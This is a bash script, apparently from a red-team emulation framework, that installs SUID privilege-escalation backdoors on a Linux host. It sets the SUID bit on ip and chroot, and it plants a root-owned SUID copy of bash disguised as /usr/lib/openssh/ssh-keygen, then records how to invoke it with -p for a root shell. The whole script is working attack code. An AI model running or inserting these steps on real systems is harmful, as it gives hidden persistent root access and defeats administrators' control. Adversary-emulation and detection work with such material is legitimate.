#!/usr/bin/env bash
#
# payloads/priv_esc/suid_tool_backdoors/commands.sh
#
# Installs SUID privilege-escalation backdoors modeled after red-team malware
# tradecraft observed in local lab scenarios.

set -euo pipefail

if [[ -z "${FRAMEWORK_ROOT:-}" ]]; then
    echo "[x] FRAMEWORK_ROOT must be set" >&2
    exit 1
fi

source "$FRAMEWORK_ROOT/lib/log_utils.sh"
source "$FRAMEWORK_ROOT/lib/metadata_utils.sh"
source "$FRAMEWORK_ROOT/lib/privilege_utils.sh"

shell_quote() {
    printf "%q" "$1"
}

run_priv_checked() {
    local cmd="$1"
    log "run_priv: $cmd"
    run_priv "$cmd"
}

require_privilege

SET_SUID_ON_IP="${SET_SUID_ON_IP:-true}"
SET_SUID_ON_CHROOT="${SET_SUID_ON_CHROOT:-true}"
INSTALL_SUID_BASH_COPY="${INSTALL_SUID_BASH_COPY:-true}"
SUID_BASH_DEST="${SUID_BASH_DEST:-/usr/lib/openssh/ssh-keygen}"
SUID_BASH_MODE="${SUID_BASH_MODE:-4755}"

log "suid_tool_backdoors starting"
log "Execution user: $(whoami)"
log "Execution id: $(id)"

IP_PATH="$(command -v ip || true)"
CHROOT_PATH="$(command -v chroot || true)"
BASH_PATH="$(command -v bash || true)"

[[ -n "$BASH_PATH" ]] || fail "bash not found"

if [[ "$SET_SUID_ON_IP" == "true" ]]; then
    if [[ -n "$IP_PATH" ]]; then
        q_ip_path="$(shell_quote "$IP_PATH")"
        log "Setting SUID on ip"
        run_priv_checked "chmod u+s $q_ip_path"
        record_metadata "suid_modified_path=$IP_PATH"
    else
        warn "ip command not found, skipping"
    fi
fi

if [[ "$SET_SUID_ON_CHROOT" == "true" ]]; then
    if [[ -n "$CHROOT_PATH" ]]; then
        q_chroot_path="$(shell_quote "$CHROOT_PATH")"
        log "Setting SUID on chroot"
        run_priv_checked "chmod u+s $q_chroot_path"
        record_metadata "suid_modified_path=$CHROOT_PATH"
        record_metadata "root_exec_chroot_path=$CHROOT_PATH"
    else
        warn "chroot command not found, skipping"
    fi
fi

if [[ "$INSTALL_SUID_BASH_COPY" == "true" ]]; then
    SUID_BASH_DIR="$(dirname "$SUID_BASH_DEST")"

    q_bash_path="$(shell_quote "$BASH_PATH")"
    q_suid_bash_dir="$(shell_quote "$SUID_BASH_DIR")"
    q_suid_bash_dest="$(shell_quote "$SUID_BASH_DEST")"
    q_suid_bash_mode="$(shell_quote "$SUID_BASH_MODE")"

    log "Installing SUID bash copy"
    log "SUID bash destination: $SUID_BASH_DEST"

    run_priv_checked "mkdir -p $q_suid_bash_dir"
    run_priv_checked "cp $q_bash_path $q_suid_bash_dest"
    run_priv_checked "chown root:root $q_suid_bash_dest"
    run_priv_checked "chmod $q_suid_bash_mode $q_suid_bash_dest"

    record_metadata "suid_bash_copy=$SUID_BASH_DEST"
    record_metadata "root_exec_method=suid_bash"
    record_metadata "root_exec_path=$SUID_BASH_DEST"
    record_metadata "root_exec_args=-p"
fi

log "suid_tool_backdoors complete"
